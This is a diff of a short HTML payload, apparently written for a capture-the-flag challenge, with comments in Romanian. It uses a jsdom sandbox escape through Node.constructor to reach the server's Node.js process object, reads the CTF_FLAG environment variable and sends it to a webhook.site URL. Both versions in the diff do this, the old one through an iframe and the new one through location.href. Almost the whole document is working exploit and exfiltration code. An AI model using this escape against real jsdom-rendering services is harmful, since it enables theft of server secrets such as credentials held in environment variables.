@@ -1,20 +1,16 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <iframe id="exfil" src="https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/start"></iframe>
-
     <script>
-        // Pasul 2: Folosim vulnerabilitatea jsdom pentru a accesa obiectul 'process' din Node.js [cite: 115, 121]
-        const outerRealmFunctionConstructor = Node.constructor; 
-        const process = new outerRealmFunctionConstructor("return process")(); 
+        // Folosim constructorul pentru a accesa mediul Node.js de pe server [cite: 120, 121]
+        const process = new (Node.constructor)("return process")();
+        
+        // Extragem flag-ul din variabila de mediu [cite: 98, 123]
+        const flag = process.env.CTF_FLAG;
 
-        // Pasul 3: Așteptăm 2 secunde pentru ca jsdom să încarce totul, apoi trimitem flag-ul [cite: 122, 124]
-        setTimeout(function() {
-            // Extragem variabila de mediu CTF_FLAG [cite: 98, 123]
-            const flag = JSON.stringify(process.env['CTF_FLAG']); 
-            // Schimbăm sursa iframe-ului pentru a face un request GET către tine cu flag-ul în URL [cite: 110, 127]
-            exfil.src = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?flag=" + btoa(flag);
-        }, 2000); 
+        // Trimitem flag-ul direct ca parametru în URL către Webhook
+        // Înlocuiește ID-ul de mai jos cu ID-ul tău real
+        location.href = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?flag=" + flag;
     </script>
 </body>
 </html>
